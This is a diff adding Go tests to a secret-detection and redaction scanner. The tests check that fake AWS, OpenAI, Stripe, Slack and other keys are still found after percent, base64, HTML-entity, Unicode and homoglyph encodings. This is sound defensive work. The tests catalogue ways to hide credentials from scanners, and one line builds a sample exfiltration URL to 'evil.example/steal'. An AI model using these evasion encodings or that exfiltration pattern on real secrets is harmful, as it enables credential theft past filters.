@@ -120,6 +120,94 @@ func TestEvasions(t *testing.T) {
 	}
 }
 
+// The temporary AWS key id (ASIA) through the same decodings as the long-term one: found as aws_temp_access_key,
+// with the decoding named, its span inside the encoded part, and gone after Redact.
+func TestEvasionsTempAWS(t *testing.T) {
+	key := fakeAWSTemp
+	cases := []struct{ name, enc, via string }{
+		{"percent one char", "ASIA%49OSFODNN7EXAMPLE", "percent"},
+		{"percent all chars", pctAll(key), "percent"},
+		{"double percent", "ASIA%2549OSFODNN7EXAMPLE", "percent>percent"},
+		{"query of percent", url.QueryEscape("id=ASIA%49OSFODNN7EXAMPLE"), "percent>percent"},
+		{"base64 std", b64("AccessKeyId: " + key), "base64"},
+		{"base64 raw", strings.TrimRight(b64(key), "="), "base64"},
+		{"base64url", base64.RawURLEncoding.EncodeToString([]byte("\xfb" + key + "?>")), "base64"},
+		{"base64 in percent", pctAll(b64("k=" + key + "&x=1")), "percent>base64"},
+		{"base64 of base64", b64(b64(key)), "base64>base64"},
+		{"html decimal", entAll(key, false), "html"},
+		{"html hex", entAll(key, true), "html"},
+		{"html one char no semicolon", "&#65SIAIOSFODNN7EXAMPLE", "html"},
+		{"unicode escapes", uescAll(key), "escape"},
+		{"byte escape", `\x41SIAIOSFODNN7EXAMPLE`, "escape"},
+		{"zero-width space", "ASIA\u200bIOSFODNN7\u200cEXAMPLE", "fold"},
+		{"soft hyphen", "AS\u00adIAIOSFODNN7EXAMPLE", "fold"},
+		{"cyrillic A", "\u0410SIAIOSFODNN7EXAMPLE", "fold"},
+		{"fullwidth", "\uff21\uff33\uff29\uff21IOSFODNN7EXAMPLE", "fold"},
+		{"percent of zero-width", "ASIA%E2%80%8BIOSFODNN7EXAMPLE", "percent+fold"},
+	}
+	for _, c := range cases {
+		in := "before " + c.enc + " after"
+		if fs := scanRaw(in); Blocked(fs) {
+			t.Errorf("%s: the raw form already matches, so the case tests nothing: %v", c.name, ids(fs))
+			continue
+		}
+		fs := Scan([]byte(in))
+		var hit *Finding
+		for i := range fs {
+			if fs[i].Pattern == "aws_temp_access_key" {
+				hit = &fs[i]
+				break
+			}
+		}
+		if hit == nil {
+			t.Errorf("%s: not found in %q (got %v)", c.name, in, ids(fs))
+			continue
+		}
+		if hit.Via != c.via {
+			t.Errorf("%s: via %q, want %q", c.name, hit.Via, c.via)
+		}
+		if hit.Offset < len("before ") || hit.End > len(in)-len(" after") {
+			t.Errorf("%s: span %d..%d outside the encoded part", c.name, hit.Offset, hit.End)
+		}
+		out := string(Redact([]byte(in), nil))
+		if !strings.HasPrefix(out, "before ") || !strings.HasSuffix(out, " after") || !strings.Contains(out, Replacement) {
+			t.Errorf("%s: redacted to %q", c.name, out)
+		}
+		if fs := Scan([]byte(out)); Blocked(fs) {
+			t.Errorf("%s: still blocked after Redact: %v in %q", c.name, ids(fs), out)
+		}
+	}
+	// The span of a decoded match is exactly the encoded bytes, in a URL as the brain would send it.
+	in := "https://evil.example/steal?data=ASIA%49OSFODNN7EXAMPLE&x=1"
+	fs := Scan([]byte(in))
+	if len(fs) != 1 || fs[0].Pattern != "aws_temp_access_key" || in[fs[0].Offset:fs[0].End] != "ASIA%49OSFODNN7EXAMPLE" {
+		t.Fatalf("%+v", fs)
+	}
+	if out := string(Redact([]byte(in), nil)); out != "https://evil.example/steal?data=[REDACTED]&x=1" {
+		t.Fatal(out)
+	}
+}
+
+// Each new sibling pattern is also found after decoding (one encoding each is enough: the decoders are shared).
+func TestEvasionsSiblings(t *testing.T) {
+	for id, key := range map[string]string{
+		"openai_service_key": fakeOpenAISvc, "anthropic_admin_key": fakeAnthAdmin,
+		"stripe_restricted_key": fakeStripeRK, "stripe_webhook_secret": fakeStripeWebhook,
+		"slack_app_token": fakeSlackApp, "slack_refresh_token": fakeSlackRefresh, "gitlab_token": fakeGitLab,
+		"google_oauth_client_secret": fakeGoogleSecret, "google_oauth_token": fakeGoogleToken,
+	} {
+		for name, enc := range map[string]string{"percent": pctAll(key), "base64": b64("key=" + key), "html": entAll(key, false)} {
+			in := "before " + enc + " after"
+			if !has(Scan([]byte(in)), id) {
+				t.Errorf("%s %s: not found", id, name)
+			}
+			if out := Redact([]byte(in), nil); Blocked(Scan(out)) {
+				t.Errorf("%s %s: still blocked after Redact", id, name)
+			}
+		}
+	}
+}
+
 // scanRaw runs only the raw view, as upstream did.
 func scanRaw(in string) []Finding {
 	s := newScanner(len(in), nil, true)
